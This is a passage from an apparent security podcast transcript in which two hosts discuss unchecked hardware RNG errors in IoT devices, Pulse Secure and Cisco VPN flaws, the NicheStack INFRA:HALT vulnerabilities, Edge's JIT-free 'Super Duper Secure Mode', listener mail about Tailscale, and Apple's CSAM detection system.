And then what we would have is a cryptographically secure pseudo random number generator, a CSPRNG, that would be designed in software to take that pool of entropy and produce a series of really high-quality keys.  Technically each one is not random because at that point it's based on software.  But it's pulling from a large enough pool of true randomness that it is cryptographically strong enough for our purposes.  And after using it for some length of time, we decide that we've pulled as much entropy out of that pool as is safe to do.  And hopefully in the meantime our little hardware generator has been sniffing more static from the ether and preparing another pool for us to switch to.



And this is classically how things are done in big operating systems.  Linux does something exactly like this, pulling from a bunch of different sources of entropy, pouring it all in.  And we talked about that.  We did a podcast in fact once called "Harvesting Entropy," where I talked about the system, very much like this, that I designed for SQRL in the early days of that work.



LEO:  That's what Cloudflare has in their lobby, which is a bunch of lava lamps.



STEVE:  Yes.  With a webcam.



LEO:  With a webcam.  And apparently chaotic enough that you're getting some pretty good entropy with the lava lamps.



STEVE:  So, okay.  So it turns out this is not what happened in our IoT devices.



LEO:  Of course it's not.  What a surprise.



STEVE:  For one thing, many of these systems on a chip are very resource constrained.  They don't have enough extra RAM to, I mean, barely enough to hold the stuff they need, let alone create a sufficiently large pool of entropy.  So the designers of the hardware said, okay, we can do this in hardware.  And they built in their own source of entropy noise.  One of the fundamental components in electronics is a diode.  Probably everybody knows a diode uses the properties of semiconduction to only allow an electric current to flow through it in one direction.  Well, okay, at least in theory.  It strongly resists any current flow in the opposite direction.



But there's a limit known as the diode's breakdown voltage above which a diode will start to leak in its reverse direction.  And it turns out that, as individual electrons valiantly tunnel their way essentially upstream or against the diode's attempt to block them, they do emerge victorious on the other side.  This breakdown current is quite noisy.  It doesn't have any sort of perfect 50/50 property to it yet.  But it is utterly unpredictable because it's just based on quantum physics, literally, quantum physic tunneling of electrons.



So it can serve as a starting point for the system-on-a-chip's full built-in hardware random number generator which needs to do a bunch of, like, whitening and purifying and balancing in order to bring us to a, like, 50/50 probability bits, which is what we need.  So it needs to do a lot of work still.  But it doesn't need, you know, it's able to do it all in hardware.  And it brings us, it gives us something that meets that simple definition that we began with.



LEO:  Just parenthetically, does it then use that as the seed for the random number generator?  Or is it more sophisticated than that?



STEVE:  It's actually more sophisticated than that.



LEO:  Okay.



STEVE:  It takes a bunch of that, and it compares them with each other, like if you've got a bunch of bits that are not 50/50, but if you XOR them with others that are also not 50/50, it ends up quickly falling out.  So you're able to do some hardware tricks that are very simple and give you high-quality randomness, given the particular characteristics that like the low-level electron event thing produces.



LEO:  So that becomes the random number generator, then.



STEVE:  Yes, exactly.



LEO:  That's the number.  Those are the random numbers coming at it, I get it, okay. 



STEVE:  Yes.  It turns out that we're back to a resource constraint problem almost immediately.  And IoT hardware has taken a shortcut of using a pure hardware generator that unfortunately, Leo, and here's where it comes out, has a limited rate of entropy generation.  The reason our Linux OS uses an entropy pool is that scientists who designed this understood that we might be measuring a network packet arrival time with high resolution.  We might be pulling data out of the processor, like there are all these performance counters, how many branches are taken and not taken, exactly how may clock cycles we had.  So you can take all these different sources that are unpredictable, but none of them are super high rate.



So this is the reason you accumulate them in this entropy pool, and then you use software to churn that in order to generate, to satisfy the operating system's maybe very hungry need.  You know, a server that is actively terminating thousands of connections per second, right, it's accepting incoming queries, individual TLS connections, it's hungry for entropy.  It needs entropy for every single one of those TLS connections that it terminates.  It has to have randomness.  So we solve this problem on a mature OS with a hybrid.  We take a low-rate source of entropy, and then we accumulate that in a pool and then use software.  Systems on a chip don't do that.



Writing about the need for IoT devices to have entropy sources, Dan and Allan, who are with Bishop Fox, the people who presented this DEF CON presentation, explain that:  "As of 2021, most IoT systems-on-a-chip have a dedicated hardware random number generator peripheral that's designed to solve this problem."  That is, the need for entropy.  They said:  "But unfortunately, it's not that simple.  How you use the peripheral is critically important, and the current state of the art in IoT can only be aptly described as 'doing it wrong.'"



Okay.  So get a load of this.  The researchers found example after example where the code that was calling the hardware's built-in random number generator API always assumed that the API call succeeded in providing them...



LEO:  Of course it did.



STEVE:  Uh-huh, with the valid random data they had requested, and the code never bothered to check for the error status returned from the API, stating that the request could not be met at this time.



LEO:  Wow.



STEVE:  So if you think about it, the really tricky thing about this is that, if you're asking for random data, anything that is returned is valid; right?  I mean, as unlikely as it might be, getting all zeroes back from a request for a completely random number would not be itself an error since, while it would be incredibly unlikely, it's possible.  So if you don't deliberately check the success or failure status of a request for random data, you'll still get data.  But it might not be at all random.



A GitHub search for this mistake made in IoT code based upon the very popular MediaTek 7697 System-on-a-Chip Hardware Abstraction Layer, their HAL, the search for their mistake found 3,218 separate hits in GitHub.  And a similar GitHub search for mistaken use of the hugely popular FreeRTOS IoT operating system turned up, looking for the mistake, right, mistaken use of this in FreeRTOS turned up 36,696 instances of improper use.  As the authors wrote in their write-up where they show the C-code snippets, they said:  "Notice that the return code is pervasively not checked, though this isn't unique to these two examples.  This is just how the IoT industry does it. You'll find this behavior," they wrote, "across basically every SDK and IoT OS."



So as not to put any words in their mouth, I'm going to quote from their write-up under "What's the worst that could happen?"  They said:  "Okay.  So devices aren't checking the error code of the RNG HAL function," the random number generator hardware abstraction layer function.  "But how bad is it really?  It depends on the specific device, but potentially bad.  Very bad."  They said:  "Let's take a look.  The HAL function to the RNG peripheral can fail for a variety of reasons, but by far the most common and exploitable is that the device has run out of entropy.  Hardware RNG peripherals pull entropy out of the universe through a variety of means," they said, "such as analog sensors or EMF readings, but don't have it in infinite supply.  They're only capable of producing so many random bits per second.  If you try calling the RNG HAL function when it doesn't have any random numbers to give you, it will fail and return an error code.  Thus, if the device tries to get too many random numbers too quickly, the calls will begin to fail.



"But that's the thing about random numbers.  It's not enough to just have one.  When a device needs to generate a 2048-bit private key, as a conservative example, it will call the RNG HAL function over and over in a loop. This starts to seriously tax the hardware's ability to keep up; and in practice, they often can't.  The first few calls may succeed, but they will typically start to cause errors quickly."



So what does the HAL function give you for a random number when it fails?  Depending on hardware, one of the following:  partial entropy, the number zero, or some uninitialized memory.  Which is to say something, but it doesn't ever change because it's just memory somewhere.  So as a consequence of this, the feeling of security that we all have is illusory with our IoT devices.  Oh, yes.  We have TLS.  Yay.  But if the TLS handshake is based upon all zeroes or static unchanging keys, then TLS is just adding a bunch of overhead on the connection and not providing any true privacy.  As I've noted before, the entire world has rushed headlong into IoT without any standards, nor anything like an Underwriters Laboratories for device security.  Outside, the box says "uses the most advanced military grade encryption," but fails to mention that it also uses null crypto keys.  Whoops. 



LEO:  They're not technically wrong.



STEVE:  Think that might matter?  Oh, lord.  Yes.  So anyway, good to know.  It's a function of the design.  These guys discovered that any device where the application running on the IoT OS is asking for lots of entropy.  And who knows, it depends upon what the app is doing, the device might run out of it and just say, no, you can't have it.  But that refusal doesn't ever get checked, even at the OS level.  It's not that the app isn't.  But when they talk about the HAL, the Hardware Abstraction Layer, they're talking about a sort of a generic IoT OS which has been ported to a bunch of different underlying hardware.  And it doesn't check.  So the API just says, yeah, here's your entropy.  Even if it's zeroes.



LEO:  Wow.



STEVE:  Yeah.  As we know, abuse of VPNs and Microsoft's Remote Desktop Protocol (RDP) are currently two of the most popular means for hackers to get into an enterprise's network.  It's a problem when valid username and password login credentials are obtained.  As we know, these days such credentials may find a ready market, depending upon the value of the company they're protecting.  So this allows for targeted attacks.  But it's much worse when the product itself has exploitable vulnerabilities because then all of the users of the affected product will be open to exploitation until an update has not only been made available, but also installed.



The Pulse Secure VPN has been in the news all year due to continuing problems with vulnerabilities which are believed to have been leveraged as the way hackers conducted a number of recent attacks.  I generally don't talk about it because by the time we get it in the news, it's been patched, and it's like, okay, fine.  Well, there's other stuff to talk about that's like zero-day, get you right now.  But this problem won't go away with Pulse Secure.  So it finally rose to a level of, okay, I've got to talk about this.  It's back in the news because the company, Ivanti, are trying again to fix a critical flaw that it first tried to fix last October, when I chose not to talk about it because I thought it had been fixed.  Turns out no.



The trouble is a critical post-authentication remote code execution vulnerability which exists in their Connect Secure VPN appliances.  This flaw - which has the CVE of 2020 because, as I said, last year, and 8260.  It was one of the four Pulse Secure flaws that were being actively exploited by bad guys in April in a series of intrusions targeting defense, government, and financial entities in the U.S. and elsewhere.  Given the proven real-world exploitation, it is strongly recommended that anyone using Pulse's Connect Secure, that's PCS, Pulse Connect Secure, 9.1R12 or later should be certain to be current with all relevant updates.  So just a heads-up to any listeners whose enterprises may be using this Ivanti Pulse Connect Secure.



Richard Warren with the NCC Group said last Friday, he said:  "The Pulse Connect Secure appliance suffers from an uncontrolled archive extraction vulnerability which allows an attacker to overwrite arbitrary files, resulting in Remote Code Execution as root.  This vulnerability is a bypass of the patch for CVE-2020-8260 from last October.  An attacker obtaining such access will be able to circumvent any restrictions enforced via the web application, as well as remount the filesystem, allowing them to create a persistent backdoor, extract and decrypt credentials, compromise VPN clients, or pivot into the internal network."



This all occurred after Ivanti, as I said, Pulse Secure's publisher, published an advisory for six security vulnerabilities on Monday, August 2nd, so Monday before last.  At that time, Ivanti urged their customers to move quickly to update to version 9.1R12 to secure against any exploitation of those flaws.  Which is why I said, yes, and now look again because there's been another problem which is the circumvention of one of these things.  So you need to make sure that you have updated yet again because, if you did this Monday before last, you've got problems still.



And speaking of problems still, Ivanti is not alone with their VPN troubles.  Last Wednesday Cisco released patches for two serious flaws affecting many of their VPN products.  The two security flaws are CVE-2021-1609  and that has one of those very difficult to obtain CVSSes of 9.8.  Wow.  We've seen 9.9 a couple times, but 8's right there.  And also 2021-1602, which is a CVSS of 8.2/10.  They were discovered in the - and boy, this is a broken record - web-based management interfaces and are the result of improperly validated HTTP requests and insufficient user input validation.  And no, this is not the year 2000.  This is the year 2021.  We're still having these same problems.  And being in the web management interface, they result in pre-authentication security vulnerabilities impacting multiple small business VPN routers and allowing remote attackers to trigger a denial of service condition, or execute commands if they're a little more clever, and arbitrary code on vulnerable devices.



So the first of these problems, that 9.8 one, that impacts the RV340 and 345 family, so RV340 and 340W - typically W means WiFi - RV345 and 345P Dual WAN Gigabit VPN routers.  The second flaw that was at 8.2, that's the RV160, 160W, 260, 260P, and 260W VPN routers.  So if you're aware of, again, your enterprise having any of those, make sure that they are updated.  The good news, however, is that the remote management WAN interface is disabled by default.  So Cisco got that part right.  So on the other hand, nothing to prevent some irresponsible IT person from thinking, you know - or maybe this is on a satellite office, and he said, yeah, I need that because I need to be able to remotely admin the VPN on an office remotely.  And of course he should have VPN'd into it and admin'd on the LAN interface of that.  But maybe not.



So if the WAN interface is enabled, you've got a problem, and you want to make sure to get that fixed because these things, as we know, are not difficult to find using Shodan.  And if an attacker were to get on the LAN, then they could use their brief presence there to access the LAN interface, which get this, cannot be disabled.  Okay, because Cisco got that wrong.  But you ought to have a terminal interface is the way to do that, and disable the always flaky web management interface because again, as I said, in 21 years we still haven't managed to get that right.



So patch.  Patch, patch, patch.  Get these Cisco systems up to date and realize that you are unable to disable the LAN side interface.  So if somebody did briefly get in, they could create a VPN account for themselves which probably nobody would notice for a long time, and then they'd have remote access anytime they needed it in the future.  For what it's worth, just go to basic settings and then remote management, and you'll find the WAN flip switch there.  Make sure it's off.  And really, just even after you patch, if you don't really need remote WAN access, it's just bad to have anything web interface facing the public Internet.  It's just not going to have a happy ending.



LEO:  That was a deep sigh.



STEVE:  You know?  Maybe the way we got into all this trouble with these computers in our little devices is that they don't seem like computers.  And I'm, like, because PCs always seemed like they were obviously computers, and I guess they were crashing in the beginning - remember that's why we all developed the CTRL+S habit of constantly saving our work, because it could freeze up at any moment.  So there was this sense of, oh, you know, maybe another patch is what I need.  But if it's a widget, a gadget, a webcam, a baby monitor, a doorbell, it just sort of seems like, oh, look, it's a doorbell that does extra stuff.



LEO:  An appliance; right.



STEVE:  Yeah.  That must - I'm trying to explain this.  Anyway, so 14 newly disclosed and - first discovered, obviously, then disclosed vulnerabilities collectively referred to as INFRA:HALT, INFRA:HALT for some reason in all caps, I don't think it's an acronym or an abbreviation for anything, they were discovered by the work of a joint research effort by security teams at Forescout and JFrog.  These vulnerabilities impact an extremely, and I mean, like, the - as I'll enumerate that in a minute - popular TCP/IP library which is commonly used in industrial equipment and, now, here's a new term, Operational Technology (OT) devices manufactured by more than 200 vendors, Leo.  200 vendors.  Okay.  So this thing is called NicheStack, I guess, N-I-C-H-E?



LEO:  Yeah.



STEVE:  NicheStack.



LEO:  NicheStack, yeah.



STEVE:  It's a proprietary, so it's not open source, nobody gets to look in and go, oh, naughty, naughty.  No.  Proprietary TCP/IP stack developed originally by InterNiche Technologies, which was acquired by HCC Embedded in 2016.  The earliest copyright messages indicate that the stack was created in 1996.  Okay, now...



LEO:  Wow.  That's a long time ago.



STEVE:  It was.  And that's going to be - we're going to come back to that because unfortunately it hasn't been looked at since 1996, and the world doesn't even look the same.  That was 25 years ago.  Okay. 



LEO:  Yeah.  Early, early Internet. 



STEVE:  Yeah.  Although InterNiche was founded in '89.  So InterNiche, founded in '89, they wrote this thing in '96, some clown, I'll get to the clown in a minute, in '96.  Then HCC Embedded bought it from them in 2016.  The stack was extended to support IPv6 in 2003.  Okay, so now not such a good excuse, although still that was quite a while ago, what, 18 years ago.  In the last two decades the stack was distributed in several flavors by OEMs such as STMicroelectronics; Freescale, also known as NXP; Altera, now owned by Intel; and Microchip for use with several real-time operating systems and in its own simple RTOS called NicheTask.  It also serves as the basis for other - the basis - for other TCP/IP stacks.



Okay, now, first of all, what's this OT?  Operational Technology, or OT, is not a term we've used before.  I think we're going to be seeing it.  NIST defines it as "Programmable systems or devices that interact with the physical environment, or manage devices that interact with the physical environment.  These systems or devices detect or cause a direct change through the monitoring or control of devices, processes, and events. Examples include industrial control systems, building management systems, fire control systems, and physical access control mechanisms."



LEO:  This came up actually in the Colonial Pipeline attack.  Stacey used that term first because the hack, the ransomware hit their IT, but not their OT.  Nevertheless they shut the pipeline down, the OT down for fear that, because of the ransomware in the IT, that it would be damaged.  So that's why the Pipeline was shut down.  And so that distinction actually is kind of important, IT versus OT.



STEVE:  Yes.  And it subsumes what we've traditionally been referring to as SCADA; right?  S-C-A-D-A.



LEO:  S-O-T, yeah, yeah.



STEVE:  Supervisory Control And Data Acquisition.  So I think we're now going to be talking about, just for future reference, OT, exactly as Stacey did, as operational technology as opposed to informational technology.  Okay.  So the point is, these OT systems are at the heart of today's industrial, I mean, these OT systems, meaning these ones with these TCP/IP stacks, are at the heart of industrial control and monitoring.  And of course they're being increasingly networked.  And now we learn that more than 200 vendors of these systems have all been relying upon this niche stack, which provides a library of now known to be vulnerable, this is the 14 fatal flaws story, TCP/IP networking functions.  Forescout and JFrog have collectively, as I said, named these INFRA:HALT because they allow for remote code execution, denial of service, information leakage, TCP spoofing, and DNS cache poisoning.  These are not features we want in the networked critical infrastructure monitoring and managing devices being produced by more than 200 different vendors.



And unlike our personal PCs and smartphones, these random faceless boxes buried behind crates and in closed and locked closets of industrial manufacturing facilities, you know, grease-covered things, are not accustomed to be being updated regularly, if at all, or ever.  So the disclosing researchers explained that "the nature of these vulnerabilities could lead to heightened risk and expose national critical infrastructure at a time when the industry is seeing an increase in OT attacks against global utilities, oil and gas pipeline operators, as well as healthcare and the supply chain."  Yeah, no kidding.



All versions of NicheStack prior to v4.3, which is what just came out when these guys knocked on the door of these clowns and said, uh, have you looked at your code?  Because we did.  So v4.3, including something called NicheLite, which is probably the free one, don't use it unless you've got the latest.  The patches released by HCC Embedded are available now upon request.



Wow.  Okay.  So what are the problems?  I'll just talk - I think I took the first four, and that's all I could handle.  Or maybe, yeah.  Okay.  In the DNSv4 component of NicheStack, like all the ones in the world everywhere since 1996, they found that:  "The routine for parsing DNS responses does not check the 'response data length' field of individual DNS answers, which may cause out-of-bounds read and write."  This received the difficult-to-obtain CVSS score of 9.8.  In other words, you return a DNS response to one of these things which made the query, and the response data length field length is not checked.  So have at it.  Buffer overflow, like, built-in.



In the HTTP module:  "A heap buffer overflow exists in the code that parses the HTTP POST request due to a lack of size validation."  Again, it's hard to even say this because, like, what?  Okay.  And I wrote in my notes, that's just difficult to excuse.  That's, you know, like checking the length is so basic.  And that gets it a CVSS of 9.1.  Also in the DNSv4 code:  "The routine for parsing DNS names does not check whether a compression pointer points within the bounds of the packet, which leads to out-of-band write."



Now, okay.  I've written a bunch of DNS parsing code myself since I have the DNS Benchmark and the DNS Spoofability system, which that's like all it did.  So I know this stuff pretty well.  The guys who designed the DNS on the wire format, that is, the actual packet of the data in the DNS packet, were very clever.  They realized that DNS packets would naturally contain a lot of redundancy.  So for example, when you get a DNS answer, it contains the DNS query which would have been to, say for example, sqrl.grc.com.  So a single DNS packet might have answers for maybe grc.com, www.grc.com, forums.grc.com, sqrl.grc.com.



And instead of wasting space in the packet, either the query or the reply for all of those redundant grc.coms, the DNS packet spec definition, the RFC, written early, allows a DNS name prefix like www, or forums, and then a pointer to the rest of the DNS name occurring anywhere in the packet, typically at the beginning of the packet somewhere.  Since using a short pointer to point to a longer string compresses the size of the overall packet, it's referred to as a "compression pointer."



So in this example, the string GRC.com would only occur one time in the DNS packet, probably in the query portion, which is the beginning of a DNS packet, and everything else would contain just a pointer to that one instance rather than repeating it.  And the benefit is that there is a limit on the size of a UDP packet.  If you can't get it into a single UDP packet, you then need, because DNS doesn't fragment by design, you then would have to set up a TCP connection in order to send a larger DNS query.  You really want to avoid that.



These guys did want to avoid that.  So they added a little bit of complexity to the spec, but it dramatically collapses the size of the packet so that really, like, packets containing a whole bunch of stuff about a domain are able to fit in a single DNS packet.  So now we learn that this widespread and pervasively used TCP/IP stack's DNS parser does not check whether a compression pointer points within the bounds of a packet.  Again, it's unconscionable.  And everyone is using this code because it works.  So why not?



But wait, there's one more.  The routine for parsing DNS responses does not check whether the number of queries/responses specified in the packet's header corresponds to the actual number of queries and responses available in the DNS packet, which again leads to an out-of-bound read opportunity.  I don't think we've probably ever encountered on this podcast a clearer example of code that was shipped because it worked, with no apparent thought whatsoever, not even a heartbeat, given to that code's security.  And there's 10 more vulnerabilities just like those.  But you get the idea.



Okay.  So as I said, if the earliest copyright carried by the stack is 1996, that means that at least some of this code is 25 years old.  And when it was updated in '03 to add IPv6 support, apparently nothing was fixed because this is now, like just before this was reported, all of the stuff that's been done for the last 18 years that may or may not have had IPv6 conditionally compiled into it, would have that, too, I mean, still has all the bugs.  So I guess I could cut it some slack.  After all, the Internet's original RFCs don't ever mention security at all.  I read them.  TCP/IP, DNS, no.  These guys were just hoping it would work. 



LEO:  Yeah.  They had no thought of a threat model.



STEVE:  No.



LEO:  Why would you mess with that?



STEVE:  Why would you ever want the pointer to point somewhere else?  That would be really dumb.



LEO:  Yeah, that would be silly.  Why would you do that?



STEVE:  So all they ever specified in the RFCs is what it should do, and not what to do if it does something dumb because why would you do that?



LEO:  A bunch of smart engineers, they're not going to do that.



STEVE:  Right, exactly.



LEO:  It really is a completely different mindset.  I once asked Vint Cerf:  "If you were redesigning TCP/IP today, what would you do differently?"  He said:  "I'd build in encryption, for one thing."  Right?  But this is just another example.  I mean, they just weren't thinking that way.



STEVE:  The researchers found a legacy website listing the main customers of InterNiche.  According to the website, most of the top industrial automation enterprises in the world use this stack from InterNiche.  And in addition to those, the website mentions another nearly 200 device vendors who do.  So the researchers queried Shodan looking for devices showing some evidence of NicheStack out on the public Internet, for example, application-layer welcome banners, you know, when you connect to the HTTP server it often announces itself.  And if it says InterNiche, whoops.



Well, on March 8th of this year they found - they asked Shodan.  They found more than 6,400 devices running, proudly putting NicheStack right out there on the public Internet.  Of those devices, the large majority, 6,360, run an HTTP server, which doesn't check the length of posts that you send to it, allowing you to do pretty much anything you want, while the others run FTP, SSH, and Telnet.  Talk about a target-rich environment.  And now those are just what Shodan found on the public Internet.  It's without question the case that millions of these things are networked internally.  Thank god they don't have a public face.  But it does mean that, if bad guys from somewhere else want to cause trouble, we already know they can get in.



The question is what are they going to do once they have?  Well, they can encrypt all of an enterprise's data.  Now they know that probably any OT thing they find, they can commandeer.  So talk about a target-rich environment.  It's good that this research was done.  Now the NicheStack has been significantly cleaned up.  Again, it's closed source and proprietary; right?  So it's not like that the source was open, and they said, okay, fine, here, let's take a look at this.  All new code built using it will be much better than ever before.  We don't know if it's going to be perfect, but there's 14 fatal flaws that have been forever found.  How's that for some alliteration?



But a massive amount of damage has already been done over the course of the past 25 years through the proliferation of this disastrous TCP/IP stack on anything that has a network connection, probably.  There are countless things out in the world now containing that stack, and as I said, even if they aren't exposed to the public Internet.  It is the case that conscientious state actors will have added these datums to their comprehensive device vulnerability databases for the day when they have a need to penetrate and screw with any of those millions of vulnerable boxes still containing an old NicheStack connected to the network.  There's no way that some long-forgotten steam room controlled by something in a box underneath the table of something is ever going to be updated.  It just isn't.  So that's the world we have today.



LEO:  You're right.



STEVE:  Okay.  A little bit of interesting fun.  Microsoft Edge is maybe going to be getting something that they actually call "Super Duper Secure Mode."  They realize full well that...



LEO:  They call it Super Duper Secure Mode?



STEVE:  Yes.



LEO:  That's hysterical.



STEVE:  They are actually calling it Super Duper Secure Mode.  If you google "super duper secure mode," you'll find Microsoft.  They're not calling it that because all the serious names were taken.  They realize full well it's a humorous name; and they mention that, you know, if it ends up taking hold, maybe we're going to have to call it something else.  Maybe not, who knows.



Okay.  So here's the $64,000 question which Microsoft's experimental Edge browser Super Duper Secure Mode asks:  Would you be willing to sacrifice some web browser performance, maybe, and maybe not, but maybe some, in return for potentially significantly greater security?



LEO:  Yes.  That seems fair.



STEVE:  I think that they're onto something here.  And this is really interesting.  Based upon an analysis, and you can scroll ahead in the notes, Leo, for a couple charts, if you want to, based upon an analysis of all Chrome and Chromium browser CVEs issued since 2019, 45% of the vulnerabilities appearing in the Chromium project's V8 JavaScript and WebAssembly engine are related to its Just-in-Time component, the JIT engine.  And over half of all of Chrome's bugs overall which were found being exploited in the wild are abusing JIT bugs.  This led Microsoft's Edge vulnerability research team to wonder what the impact would be of just saying no to Chromium's JIT engine?  And the result is Edge's new experimental Super Duper Secure Mode.



Johnathan Norman, Microsoft Edge's Vulnerability Research team lead, observed that:  "This reduction of attack surface has potential to significantly improve user security.  It would remove roughly half of the V8 bugs that must be fixed.  This reduction in attack surface kills half of the bugs we see in exploits, and the bugs it doesn't kill will become more difficult to exploit.  To put it another way," he said, "we lower costs for users, but increase costs for attackers."



And Microsoft acknowledges that this challenges some conventional assumptions held by many in the browser community.  Since the JIT engine is a Just-in-Time compiler implemented to optimize performance, the immediate question that arises is "Okay, so more security.  But at what cost in performance?  That's really the question," he said, "for us to answer."  Johnathan said that recent tests carried out by the Edge team have shown that despite its pivotal role in speeding up browsers in the early and mid-2010s, and that's the key, JIT no longer appears to be a crucial feature for Edge's performance.  Much like the mistake Microsoft made of moving the GUI down into the kernel, which is now causing nightmares for performance, although today, due to the fact that everything is GPU-oriented, that doesn't need to still be there, but it is.



LEO:  It's really interesting.  Google is constantly touting improvements in JavaScript performance in Chrome.



STEVE:  Yeah.



LEO:  I thought primarily due to JIT.  But maybe not.



STEVE:  Turns out not.



LEO:  Interesting.  Interesting.



STEVE:  JIT is insanely complex.



LEO:  Yeah.  I can see why it's a security problem, for sure.



STEVE:  Yes.  How many times have we said complexity is the enemy of security?  It turns out it's so complicated that there are very few people who actually know how it works.  I mean, it is just - and in the post, in Microsoft's posting, I forgot to put a link in the show notes, they have a block diagram, like a flow diagram, and your eyes cross.  It's like, what?  So I think this represents some very interesting out-of-the-box thinking on Microsoft's part, and it makes sense.  Our system's processors have become so much more capable over the past 10 to 15 years that it's reasonable to revisit the question whether our browsers, which have grown so fast due to the processor performance, whether only an additional modest cost in performance would be - there it is, yes.  And that's...



LEO:  Turbo fan pipeline.



STEVE:  And that's one of the processing pipelines.  And notice they had to fold it back on itself because it didn't fit on the page.  It reverses course at one point and goes in the other direction.  So what they did was they did a bunch of profiling.  And as Microsoft said in that first diagram, most tests see no changes with JIT disabled.  There are a few improvements and a few regressions, but most tests remain the same because processor performance has gotten so good that it covers up the benefit that JIT used to make in 2010.  And they said that - I think it began in 2008 was when it started.  They said that, anecdotally, they found that users running with JIT disabled rarely noticed any difference in their daily browsing behavior or speed.



So anyway, I just wanted to put this on the radar.  There is a switch you can turn on to disable JIT in the pre-release versions of Edge right now - daily, nightly or whatever, and Canary and so forth.  It's not available in the release.  If it moves to release, I'll let everyone know because I'm sure there are people who are like, hey, I'll try it.  And if I don't see anything gets worse, turn it off, if it cuts in half the problems that are being found.  And it may be like the workaround of the moment.  If it turns out there's a flaw that's found with JIT on, and it's bad, and Google hasn't patched it yet, but you can turn JIT off, and it's no longer a problem, then yeah.  That's going to start really being a win for people.  So anyway, I just thought that was extremely cool, that they said, hey, you know, do we still need this?  It turns out maybe not.



Okay.  Some fun closing-the-loop feedback from our listeners.  Bob Southwell, and now the fact that his name is Bob and he's going to talk about the Bobiverse, I'm sure that's just coincidental.  He said:  "Bobiverse?  Oh, yes."  He said:  "But listen to the audiobooks.  The voice characterizations are wonderful.  Very geeky cultural references."  So I wanted to share that for our listeners.  Oh, and he DM'd me, so I saw his previous DM, and I don't know if I noticed it before.  But this was from the 12th of June in 2018.  Bob Southwell also said:  "Last lines from Netflix movie 'Anon.'"  And he quotes it.  And Leo, you mentioned, because we were talking about privacy on MacBreak Weekly, the "I don't have thing to hide" issue?



LEO:  Yeah.



STEVE:  So apparently "I don't have anything to hide.  I just don't have anything I want you to see."



LEO:  There you go.  There you go.  Simple enough.



STEVE:  It's not anything to hide.  I just don't have anything I want you to see.



LEO:  Yeah.  That's exactly right, yeah.



STEVE:  So eff off.



LEO:  Yeah.



STEVE:  Okay.  Oh, it wasn't, what did I call it?  Tailspin or something?  I don't remember what I called it at the beginning of the show.  Anyway, it's Tailscale that I talked about last week.  Deacon D:  "Hi Steve.  I just want to send a BIG THANK YOU [all caps] for turning me on to Tailscale.  Wow!!!  I have it running on two Synology NASes, two Windows boxes, and my Android phone.  It's unbelievably easy.  And like they say, it just works."  Matt Vest:  "@SGgrc Thank you so much for bringing @Tailscale to my attention.  I just set it up.  It took about 15 minutes to get it working the way I want, no firewall or port configuration effort, and it works flawlessly.  Exactly what I've been looking for."



James P:  "@SGgrc Setting up @Tailscale was so damn easy it was scary."  And finally, Marko Simo:  "Thanks again to @SGgrc for letting us SN listeners know about Tailscale.  I have now replaced my OpenVPN with it, and it blows my mind.  I think this must be the future of private networking, not just virtual, but all private networking."



So props to the Tailscale folks.  As I said, it is an overlay on top of WireGuard, and it is free for personal use.  And it sounds like enterprises may be wanting to take a look at this, if it solves the whole configuration glue, roaming users and all that, in order to create an overlay network which is secured, authenticated, and deeply encrypted and private.



And our listener who remembered, Philip Hofstetter, he said:  "@SGgrc Re the hosts file entry of your ecommerce provider, you talked about adding that entry on the show back in 2016."  And it was Episode 583.  And so on October 25th, 2016, we were covering, Leo, a major DNS outage.  In fact, it was the DYN DNS outage.



LEO:  Oh, yes, yes, yes.



STEVE:  And so I wrote:  "My own intersection with this week's problem was when I received, at about 7:30 in the morning, an iMessage from Sue, my bookkeeper.  She had been away from the office for about a week, traveling with her laptop and checking in constantly to deal with any sales GRC-related mail stuff.  And she sent me a note saying that Eudora" - and I said, yes, we're all still using Eudora.  Not true anymore, we're on Thunderbird, but back then.  She said Eudora "was returning 'GRC.com address not resolved' error.  And I thought, whoa, that's odd.  And so I shot her a text note back and said that that doesn't really sound like our problem, but I'll look into it.



"And then, like maybe two hours later, I got an alert saying that one of GRC's ecommerce transactions had failed.  So then I started seeing the news about a major DNS-related outage.  And that put all the pieces together for me.  That explained why Sue, wherever she was, whatever DNS server her location was using, was unable to obtain the IP for GRC.  And suddenly I thought, ah, I'll bet that's what's happening because of the coincidence that GRC's ecommerce system was unable to obtain the IP for the merchant gateway.  But I was able to obtain it from here where I was as a Cox cable subscriber.



"So I looked up the IP, jumped over to GRC's server to drop an entry into the hosts file.  And what I found, interestingly, was I had already commented out the line that I was going to put in.  In other words, this had happened previously.  So all I did was remove the pound sign from that line because the IP had not changed from whatever it was when I had done it before.  And then immediately ecommerce transactions started to process again."  So there you go.  Yes, and I never took it out, and their IP finally did change, and it bit me.



LEO:  Wow.  Wow.  Five years later.



STEVE:  And a good memory from one of our listeners.



LEO:  Yeah, nice.



STEVE:  Okay.  So since the first announcement, which Apple bungled, in my opinion, there's been some clarification.  I want to provide our own.  And then you and I are just going to talk about what we think it means.  So I think - okay.  So there are two completely different systems here.  I mean, completely different.  And because they've been announced together, they are being muddled and confused.  There's one system which Apple calls "CSAM Detection," and an entirely different system which Apple refers to as "Communication Safety in Messages."  So I'm going to first briefly describe each of the two systems.  Then let's talk about the consequences of this decision that Apple has made, just from what this does to change Apple.  We've talked a lot about Apple's stance in the industry from a security and privacy standpoint.  And those who like Apple and who are arguably most concerned, who would agree with the title of this podcast, are worried about what this means.



Okay.  So the intent of Apple's CSAM Detection system is expressly and only for keeping Child Sexual Abuse Material, thus CSAM, out of Apple's iCloud facility.  This is done by cross-checking the - technically they call it a neural image hash, we'll talk about that in a second - by cross-checking the image hashes of any image, any of the user's image bound for iCloud against a local archive stored in the user's phone after the iOS update of known illegal and child abusive material.  Since the user's iOS device encrypts images before they're uploaded to iCloud, this image hashing and known image archive comparison occurs before the encryption, in other words, on the user's device.  And we'll talk about why, well, why Apple did that and why they didn't have to do that here in a minute.



So some people are freaked out, wrongly believing that Apple will be loading the abusive images themselves onto everyone's phones for comparison.  Of course that's not the case.  On this podcast we understand what it means to "hash" something.  It's an extremely information lossy process that creates a fingerprint of something.  In this case it's a fingerprint of a known illegal and abusive image.  But in no way is it the image itself.  Apple calls this form of image hashing a "NeuralHash," and they describe it this way:  "The hashing technology, called NeuralHash, analyzes an image and converts it to a unique number specific to that image.  Only another image that appears nearly identical can produce the same number.  For example, images that differ in size or transcoded quality will still have the same NeuralHash value."



